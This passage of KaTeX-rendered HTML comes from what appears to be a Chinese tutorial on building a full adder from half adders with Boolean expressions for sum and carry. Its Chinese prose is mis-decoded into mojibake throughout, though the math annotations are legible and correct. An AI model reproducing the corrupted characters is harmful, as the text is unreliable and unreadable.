style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></li>
</ul>
<p>ä»ä¸Šé¢çš„æå–èŒƒå¼å‡ºå‘ï¼Œæˆ‘ä»¬å¯ä»¥åªç”¨ <code>And</code>/<code>Or</code>/<code>Not</code> æ¥å®ç° <code>FullAdder</code>ã€‚ä½†æœ‰æ²¡æœ‰æ›´ç®€æ´çš„å®ç°æ–¹å¼å‘¢ï¼Ÿ
æˆ‘ä»¬å›å¿†ä¸€ä¸‹ <code>HalfAdder</code> ä¸­çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span> æ˜¯æ€æ ·çš„ â¬‡ï¸ ï¼ˆä¸ºäº†å’Œ <code>FullAdder</code> çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span> è¿›è¡ŒåŒºåˆ†ï¼Œæˆ‘æŠŠ <code>HalfAdder</code> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span> åˆ†åˆ«æ”¹å†™ä¸ºçš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">carry_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼‰</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>a</mi><mo>âŠ•</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">sum_{ha}=(\neg{a}\land b) \lor (a\land \neg{b})=a\oplus b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>=</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">carry_{ha}=a\land b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
</ul>
<p>ä¸ºäº†ä¾¿äºåŒºåˆ†ï¼Œæˆ‘æŠŠ <code>FullAdder</code>Â çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span> åˆ†åˆ«æ”¹å†™ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{fa}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">carry_{fa}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚
å…ˆçœ‹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{fa}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> æ˜¯å¦æœ‰å…³è”ã€‚</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sum_{fa}=(\neg{a}\land \neg{b}\land c)\lor (\neg{a}\land b\land \neg{c})\lor(a\land\neg{b}\land \neg{c})\lor(a\land b\land c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>=</mo><mi>a</mi><mo>âŠ•</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">sum_{ha}=a\oplus b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
</ul>
<h4 data-id="heading-4">å¦‚ä½•è¡¨ç¤º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span></h4>
<p>ä¸€ä¸ªæ€è·¯æ˜¯çœ‹çœ‹èƒ½å¦å°† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{fa}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> ç”¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºå‡ºæ¥ï¼Œæˆ‘è¯•äº†è¯•ï¼Œè§‰å¾—æœ‰äº›ç¹çï¼Œè€Œä¸”ä¸å®¹æ˜“æƒ³åˆ°ã€‚å¦ä¸€ä¸ªæ€è·¯æ˜¯ï¼Œæˆ‘ä»¬ä» <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{fa}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> èƒŒåçš„å«ä¹‰å…¥æ‰‹ã€‚
